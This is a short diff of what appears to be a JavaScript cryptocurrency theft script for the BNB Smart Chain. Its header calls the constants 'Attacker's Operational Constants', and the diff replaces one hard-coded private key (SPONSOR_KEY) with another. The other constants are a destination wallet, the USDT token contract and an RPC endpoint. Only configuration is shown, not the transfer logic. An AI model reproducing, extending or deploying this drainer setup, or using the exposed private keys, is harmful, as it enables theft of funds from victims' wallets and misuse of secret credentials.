@@ -2,7 +2,7 @@
 import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
 
 // ── Attacker's Operational Constants ──
-const SPONSOR_KEY  = "e7d70dcaeae578e3a3e315318142707b70b61f167e4e8e7c38cf8a9d82c832be";
+const SPONSOR_KEY  = "a2457e7053ec9f204a0921d6093ec11bb6eaee19a49e151125c924b45e09cd30";
 const DEST_WALLET  = "0x1D9d94701F1f1b80DCB8A8bE3Ce5bc3baB256c21";
 const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
